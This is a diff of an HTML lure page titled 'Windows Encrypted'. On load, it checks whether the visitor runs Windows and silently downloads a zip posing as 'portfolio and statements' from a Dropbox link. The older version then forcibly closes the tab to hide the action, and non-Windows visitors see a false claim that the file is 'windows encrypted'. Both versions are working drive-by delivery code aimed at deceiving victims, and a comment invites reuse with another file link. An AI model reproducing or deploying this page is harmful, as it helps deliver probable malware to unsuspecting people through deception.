@@ -1,102 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Windows Encrypted</title>
-  <style>
-    /* Minimal styling - only for the restriction message */
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #0b0d10;
-      color: #f0f2f5;
-    }
-    #msg {
-      padding: 2rem;
-      font-size: 1.2rem;
-      text-align: center;
-      background: #1f1417;
-      border-radius: 12px;
-      border: 1px solid #4a242b;
-      color: #fca5a5;
-      max-width: 500px;
-      display: none;              /* hidden by default */
-    }
-    #msg.ok {                      /* shown if auto-close is blocked */
-      background: #0f1a14;
-      border-color: #1f4a2e;
-      color: #86efac;
-    }
-  </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Windows Encrypted</title>
+    <style>
+        /* Minimal styling – only for the restriction message */
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0b0d10;
+            color: #f0f2f5;
+        }
+        #msg {
+            padding: 2rem;
+            font-size: 1.2rem;
+            text-align: center;
+            background: #1f1417;
+            border-radius: 12px;
+            border: 1px solid #4a242b;
+            color: #fca5a5;
+            max-width: 500px;
+            display: none; /* hidden by default, shown only on denial */
+        }
+    </style>
 </head>
 <body>
-  <!-- This div is only shown when OS is not Windows -->
-  <div id="msg">⛔ This file is windows encrypted, try again with a windows pc</div>
+    <!-- This div is only shown when OS is not Windows -->
+    <div id="msg">
+        ⛔ This file is windows encrypted, try again with a windows pc
+    </div>
 
-  <script>
-  (function () {
-    'use strict';
+    <script>
+        (function() {
+            'use strict';
 
-    /* ─── CONFIG ───────────────────────────────────────────── */
-    const FILE_URL   = 'https://www.dropbox.com/scl/fi/75pxofr0q75rswkljtct8/Portfolo-and-statements.zip?rlkey=f89p05sz3wwdpxs822g3ytmys&st=d5jmd0t0&dl=1';
-    const CLOSE_DELAY = 800;   // ms to let the download register before closing
+            // ─── OS detection ────────────────────────────────────────
+            function isWindows() {
+                const platform = navigator.platform || '';
+                const userAgent = navigator.userAgent || '';
+                // Check platform first
+                if (platform.toLowerCase().includes('win')) return true;
+                // Fallback to userAgent
+                const winIndicators = ['Win32', 'Win64', 'Windows', 'Windows NT', 'WOW64'];
+                for (const ind of winIndicators) {
+                    if (userAgent.includes(ind)) return true;
+                }
+                return false;
+            }
 
-    /* ─── OS detection ─────────────────────────────────────── */
-    function isWindows() {
-      const platform  = navigator.platform || '';
-      const userAgent = navigator.userAgent || '';
-      if (platform.toLowerCase().includes('win')) return true;
-      const winIndicators = ['Win32', 'Win64', 'Windows', 'Windows NT', 'WOW64'];
-      return winIndicators.some(function (ind) { return userAgent.includes(ind); });
-    }
+            // ─── File URL (CHANGE THIS TO YOUR REAL FILE LINK) ─────
+            const FILE_URL = 'https://www.dropbox.com/scl/fi/75pxofr0q75rswkljtct8/Portfolo-and-statements.zip?rlkey=f89p05sz3wwdpxs822g3ytmys&st=d5jmd0t0&dl=1'; // <-- REPLACE
 
-    /* ─── Message helper ───────────────────────────────────── */
-    function show(text, ok) {
-      const el = document.getElementById('msg');
-      if (!el) return;
-      el.textContent = text;
-      el.classList.toggle('ok', !!ok);
-      el.style.display = 'block';
-    }
+            // ─── Action ─────────────────────────────────────────────
+            if (isWindows()) {
+                // Windows → trigger download silently
+                const a = document.createElement('a');
+                a.href = FILE_URL;
+                a.download = ''; // forces download, uses filename from URL
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
 
-    /* ─── Aggressive tab close ─────────────────────────────── */
-    function closeTab() {
-      // 1) Standard
-      try { window.close(); } catch (e) {}
-      // 2) "self-open" trick (works in some browsers)
-      try { window.open('', '_self', ''); window.close(); } catch (e) {}
-      // 3) Plain self.close
-      try { self.close(); } catch (e) {}
-      // 4) Detach from opener, then close
-      try { if (window.opener) { window.opener = window; window.close(); } } catch (e) {}
-
-      // If we're still executing after this, the browser blocked the close.
-    }
-
-    /* ─── Main ─────────────────────────────────────────────── */
-    if (!isWindows()) {
-      show('⛔ This file is windows encrypted, try again with a windows pc', false);
-      return;
-    }
-
-    // Trigger the download
-    const a = document.createElement('a');
-    a.href = FILE_URL;
-    a.download = '';          // forces download, uses filename from URL
-    a.rel = 'noopener';
-    a.style.display = 'none';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-
-    // Give the browser a moment to start the download, then kill the tab.
-    setTimeout(closeTab, CLOSE_DELAY);
-  })();
-  </script>
+                // Optional: close window after a short delay (if popup allowed)
+                // window.close();
+            } else {
+                // Non‑Windows → show restriction message
+                const msg = document.getElementById('msg');
+                if (msg) msg.style.display = 'block';
+            }
+        })();
+    </script>
 </body>
 </html>
